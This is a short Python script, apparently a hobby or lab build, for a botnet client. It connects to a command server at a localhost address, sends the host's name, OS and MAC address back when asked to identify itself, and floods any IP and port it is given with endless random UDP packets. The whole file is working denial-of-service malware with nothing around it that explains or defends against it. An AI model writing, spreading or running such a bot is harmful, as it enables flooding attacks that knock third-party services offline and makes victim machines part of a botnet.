import socket
import uuid
import platform
import random
import threading

def udp_flood(target_ip, target_port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = random._urandom(1024) 
    while True:
        try:
            sock.sendto(payload, (target_ip, int(target_port)))
        except:
            break

def start_bot():
    server_ip = '127.0.0.1' 
    port = 5555 
    
    bot = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        bot.connect((server_ip, port))
        
        ordre = bot.recv(1024).decode()
        if ordre == "IDENTIFY":
            info = f"Machine: {platform.node()} | OS: {platform.system()} | MAC: {uuid.getnode()}"
            bot.send(info.encode())

        while True:
            commande = bot.recv(1024).decode()
            if not commande: break 
            
            if commande.startswith("ATTACK"):
                parts = commande.split("|")
                target_ip = parts[1]
                target_port = int(parts[2])
                
                print(f"[*] Ordre reçu : Attaque sur {target_ip}:{target_port}")
                threading.Thread(target=udp_flood, args=(target_ip, target_port), daemon=True).start()
            
    except Exception as e:
        print(f"[!] Erreur : {e}")
    finally:
        bot.close()

if __name__ == "__main__":
    start_bot()
    